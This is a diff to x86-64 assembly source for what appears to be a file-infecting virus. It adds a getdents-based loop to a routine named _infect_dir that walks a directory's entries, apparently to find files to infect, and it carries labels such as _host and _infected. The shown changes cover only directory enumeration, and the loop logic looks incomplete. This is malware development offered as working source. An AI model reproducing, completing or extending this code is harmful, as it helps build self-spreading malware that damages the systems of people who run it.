@@ -90,7 +90,7 @@ _infect_dir:; (string rsi)
 %endif
 	push rsi
 	pop rdi
-;	sub rsp, 1024; buffer of 1024 on stack
+	sub rsp, 1024; buffer of 1024 on stack
 	push 2
 	pop rax; open
 	push 0o0200000; O_RDONLY | O_DIRECTORY
@@ -100,16 +100,52 @@ _infect_dir:; (string rsi)
 	jl _end_infect_dir; jump lower
 
 	push rdi
-	pop r10
+	pop r10; path
 	push rax
+	pop rdi; fd
+
+	_getdents:
+	push 78
+	pop rax; getdents
+	push 1024
+	pop rdx; size of buffer
+	mov rsi, rsp; buffer
+	syscall
+	cmp rax, 0x0
+	jle _end_getdents
+	push rax
+	pop rdx; nread
+	push rsi
+	pop rax
+	xor rcx, rcx; = 0
+	_loop_in_dir:
+	cmp rcx, rdx
+	jg _end_loop_in_dir; rcx > rdx
+	mov rsi, rax
+	add rsi, rcx; rax => linux_dir
+; if not . .. + 10
+	add rsi, 18
+%ifdef DEBUG
+	push rax
+	push rdi
+	push rdx
+	push rcx
+	call _print
+	pop rcx
+	pop rdx
 	pop rdi
-;	push 78
-;	pop rax; getdents
-;	push 1024
-;	pop rdx
-;	mov rsi, rsp
-;	syscall
-	
+	pop rax
+%endif
+
+	mov rsi, rax
+	add rsi, 16
+	add rcx, [rsi]
+	jmp _loop_in_dir
+	_end_loop_in_dir:
+	push rax
+	pop rsi
+	jmp _getdents
+	_end_getdents:
 	push 3
 	pop rax; close
 	syscall
@@ -118,7 +154,7 @@ _infect_dir:; (string rsi)
 	pop rdi
 
 	_end_infect_dir:
-;	add rsp, 1024
+	add rsp, 1024
 	push rdi
 	pop rsi
 ret
@@ -133,6 +169,8 @@ _host:
 _infected:
 	jmp _exit
 
+	push rdx
+	push rdx
 _exit:
 	pop rdx
 	pop r13
